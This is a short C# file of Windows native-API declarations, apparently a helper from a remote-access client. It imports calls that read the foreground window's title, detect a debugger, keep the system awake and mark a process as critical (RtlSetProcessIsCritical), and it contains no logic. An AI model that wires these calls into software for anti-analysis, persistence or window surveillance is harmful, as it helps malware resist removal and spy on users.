using System;
using System.Runtime.InteropServices;
using System.Text;

namespace Client.Helper;

public static class NativeMethods
{
	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
}
